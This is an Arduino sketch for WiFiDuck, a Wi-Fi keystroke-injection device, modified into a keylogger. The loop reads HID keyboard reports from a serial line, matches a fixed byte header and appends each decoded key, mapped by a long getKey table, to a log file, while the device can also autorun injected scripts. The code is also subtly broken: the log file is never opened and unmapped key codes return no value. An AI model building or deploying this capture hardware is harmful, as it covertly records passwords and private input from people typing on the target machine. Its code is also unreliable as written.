/*
   This software is licensed under the MIT License. See the license file for details.
   Source: https://github.com/spacehuhntech/WiFiDuck
 */

#include "config.h"
#include "debug.h"

#include "com.h"
#include "duckscript.h"
#include "webserver.h"
#include "spiffs.h"
#include "settings.h"
#include "cli.h"

File logFile;

void setup() {
    debug_init();

    delay(200);

    com::begin();

    spiffs::begin();
    settings::begin();
    cli::begin();
    webserver::begin();

    com::onDone(duckscript::nextLine);
    com::onError(duckscript::stopAll);
    com::onRepeat(duckscript::repeat);

    if (spiffs::freeBytes() > 0) com::send(MSG_STARTED);

    delay(10);
    com::update();

    debug("\n[~~~ WiFi Duck v");
    debug(VERSION);
    debugln(" Started! ~~~]");
    debugln("    __");
    debugln("___( o)>");
    debugln("\\ <_. )");
    debugln(" `---'   hjw\n");

    duckscript::run(settings::getAutorun());
}

void loop() {
     while (Serial.available() > 0) {
    //57 AB 83 0C 12 01 00 00 04 00 00 00 00 00 12 17
    if (Serial.read() == 0x83){
      delay(10);
      if (Serial.read() == 0x0C){
        delay(10);
        if (Serial.read() == 0x12){
          delay(10);
          if (Serial.read() == 0x01){
            delay(10);
            Serial.read();
            delay(10);
            Serial.read();
            delay(10);
            logFile.print(getKey(Serial.read()));
          }
        }
      }
    }
  } 
   com::update();
    webserver::update();

    debug_update();
}

String getKey(int serialData){
  if(serialData==0x00){return "";}
  if(serialData==0x04){return "A";}
  if(serialData==0x05){return "B";}
  if(serialData==0x06){return "C";}
  if(serialData==0x07){return "D";}
  if(serialData==0x08){return "E";}
  if(serialData==0x09){return "F";}
  if(serialData==0x0A){return "G";}
  if(serialData==0x0B){return "H";}
  if(serialData==0x0C){return "I";}
  if(serialData==0x0D){return "J";}
  if(serialData==0x0E){return "K";}
  if(serialData==0x0F){return "L";}
  if(serialData==0x10){return "M";}
  if(serialData==0x11){return "N";}
  if(serialData==0x12){return "O";}
  if(serialData==0x13){return "P";}
  if(serialData==0x14){return "Q";}
  if(serialData==0x15){return "R";}
  if(serialData==0x16){return "S";}
  if(serialData==0x17){return "T";}
  if(serialData==0x18){return "U";}
  if(serialData==0x19){return "V";}
  if(serialData==0x1A){return "W";}
  if(serialData==0x1B){return "X";}
  if(serialData==0x1C){return "Y";}
  if(serialData==0x1D){return "Z";}
  if(serialData==0x1E){return "[1 or !]";}
  if(serialData==0x1F){return "[2 or @]";}
  if(serialData==0x20){return "[3 or #]";}
  if(serialData==0x21){return "[4 or $]";}
  if(serialData==0x22){return "[5 or %]";}
  if(serialData==0x23){return "[6 or ^]";}
  if(serialData==0x24){return "[7 or &]";}
  if(serialData==0x25){return "[8 or *]";}
  if(serialData==0x26){return "[9 or (]";}
  if(serialData==0x27){return "[10 or )]";}
  if(serialData==0x28){return "[ENTER]";}
  if(serialData==0x29){return "[ESC]";}
  if(serialData==0x2A){return "[BACKSPACE]";}
  if(serialData==0x2B){return "[TAB]";}
  if(serialData==0x2C){return "[SPACE]";}
  if(serialData==0x2D){return "[- or _]";}
  if(serialData==0x2E){return "[= or +]";}
  if(serialData==0x2F){return "[[ or {]";}
  if(serialData==0x30){return "[] or }]";}
  if(serialData==0x31){return "[\\ or |]";}
  if(serialData==0x32){return "[` or ~]";}
  if(serialData==0x33){return "[; or :]";}
  if(serialData==0x34){return "[' or ”]";}
  if(serialData==0x35){return "[~ or `]";}
  if(serialData==0x36){return "[, or <]";}
  if(serialData==0x37){return "[. or >]";}
  if(serialData==0x38){return "[/ or ?]";}
  if(serialData==0x39){return "[CAPS]";}
  if(serialData==0x3A){return "[F1]";}
  if(serialData==0x3B){return "[F2]";}
  if(serialData==0x3C){return "[F3]";}
  if(serialData==0x3D){return "[F4]";}
  if(serialData==0x3E){return "[F5]";}
  if(serialData==0x3F){return "[F6]";}
  if(serialData==0x40){return "[F7]";}
  if(serialData==0x41){return "[F8]";}
  if(serialData==0x42){return "[F9]";}
  if(serialData==0x43){return "[F10]";}
  if(serialData==0x44){return "[F11]";}
  if(serialData==0x45){return "[F12]";}
  if(serialData==0x46){return "[PRT_SCR]";}
  if(serialData==0x47){return "[SCOLL_LOCK]";}
  if(serialData==0x48){return "[PAUSE]";}
  if(serialData==0x49){return "[INS]";}
  if(serialData==0x4A){return "[HOME]";}
  if(serialData==0x4B){return "[PAGEUP]";}
  if(serialData==0x4C){return "[DEL]";}
  if(serialData==0x4D){return "[END]";}
  if(serialData==0x4E){return "[PAGEDOWN]";}
  if(serialData==0x4F){return "[RIGHT_ARROW]";}
  if(serialData==0x50){return "[LEFT_ARROW]";}
  if(serialData==0x51){return "[DOWN_ARROW]";}
  if(serialData==0x52){return "[UP_ARROW]";}
  if(serialData==0x53){return "[PAD_NUMLOCK]";}
  if(serialData==0x54){return "[PAD_DIV]";}
  if(serialData==0x55){return "[PAD_MUL]";}
  if(serialData==0x56){return "[PAD_SUB]";}
  if(serialData==0x57){return "[PAD_ADD]";}
  if(serialData==0x58){return "[PAD_ENTER]";}
  if(serialData==0x59){return "[PAD_1]";}
  if(serialData==0x5A){return "[PAD_2]";}
  if(serialData==0x5B){return "[PAD_3]";}
  if(serialData==0x5C){return "[PAD_4]";}
  if(serialData==0x5D){return "[PAD_5]";}
  if(serialData==0x5E){return "[PAD_6]";}
  if(serialData==0x5F){return "[PAD_7]";}
  if(serialData==0x60){return "[PAD_8]";}
  if(serialData==0x61){return "[PAD_9]";}
  if(serialData==0x62){return "[PAD_0]";}
  if(serialData==0x63){return "[PAD_DOT]";}
  if(serialData==0xE0){return "[leftctrl]";}
  if(serialData==0xE2){return "[leftAlt]";}
  if(serialData==0xE1){return "[leftShift]";}
  if(serialData==0xE3){return "[leftwindows]";}
  if(serialData==0xE7){return "[rightwindows]";}
  if(serialData==0xE5){return "[rightShift]";}
  if(serialData==0xE6){return "[rightAlt]";}
  if(serialData==0xE4){return "[rightCtrl]";}
}
